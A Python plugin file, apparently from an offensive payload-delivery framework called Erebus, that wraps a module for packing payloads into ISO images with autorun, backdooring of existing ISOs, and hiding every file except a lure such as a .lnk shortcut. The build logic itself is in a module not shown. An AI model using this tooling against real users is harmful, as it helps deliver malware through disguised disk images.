"""
Erebus Plugin - ISO Container
Author: Whispergate
Description: Plugin for creating ISO containers with optional autorun

This plugin demonstrates:
1. How to inherit from ErebusPlugin
2. How to wrap existing container_iso module
3. How to create bootable ISO images with hidden files
"""

import pathlib
from typing import Dict, Callable

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory

class IsoContainerPlugin(ErebusPlugin):
    """
    Plugin for creating ISO containers.
    
    This plugin provides functionality to package payloads into ISO images
    with optional autorun functionality and file hiding capabilities.
    """
    
    def __init__(self):
        """Initialize the ISO container plugin"""
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.DEFAULT_ROOT = self.REPO_ROOT / "agent_code"
    
    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return PluginMetadata(
            name="iso_container",
            version="1.0.0",
            author="Whispergate",
            description="Creates ISO containers for payload packaging with autorun support",
            category=PluginCategory.CONTAINER,
            enabled=True
        )
    
    def register(self) -> Dict[str, Callable]:
        """Register the functions this plugin provides"""
        return {
            "build_iso": self.build_iso,
        }
    
    def validate(self) -> tuple[bool, str]:
        """Validate that required dependencies are available"""
        try:
            from pycdlib import PyCdlib
            return (True, None)
        except ImportError as e:
            return (False, f"Missing required dependency: {e}")
    
    def on_load(self):
        """Called when plugin is loaded"""
        print(f"[Plugin] ISO Container plugin loaded - Supporting ISO9660 format")

    def _get_container_iso(self):
        """Lazy import for archive.container_iso"""
        try:
            from .archive import container_iso
        except ImportError:
            from archive import container_iso
        return container_iso
    
    # ==================== Plugin Functions ====================
    
    def build_iso(
        self,
        volume_id: str = "SYSTEM",
        enable_autorun: bool = True,
        source_iso: pathlib.Path = None,
        build_path: pathlib.Path = None,
        visible_extension: str = ".lnk"
    ) -> pathlib.Path:
        """
        Create an ISO container.
        
        Args:
            volume_id: ISO volume name (appears in explorer)
            enable_autorun: Include autorun.inf for auto-execution hints
            source_iso: Optional Path to an existing ISO to backdoor
            build_path: Path to the build directory (uses default if None)
            visible_extension: The ONLY extension to keep visible (e.g., ".lnk", ".bat")
            
        Returns:
            pathlib.Path: Path to the created ISO image
            
        Raises:
            RuntimeError: If ISO creation fails
        """
        container_iso = self._get_container_iso()
        return container_iso.build_iso(
            volume_id=volume_id,
            enable_autorun=enable_autorun,
            source_iso=source_iso,
            build_path=build_path,
            visible_extension=visible_extension
        )


def get_plugin() -> IsoContainerPlugin:
    """Factory function to get plugin instance"""
    return IsoContainerPlugin()


if __name__ == "__main__":
    _plugin = IsoContainerPlugin()
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    
    # Display all registered functions
    registered = _plugin.register()
    registered_names = sorted(registered.keys()) if registered else []
    print(f"[*] Registered functions ({len(registered_names)}):")
    for func_name in registered_names:
        print(f"    - {func_name}")
    print()
    
    is_valid, error = _plugin.validate()
    if is_valid:
        print("[+] Validation passed")
    else:
        print(f"[-] Validation failed: {error}")
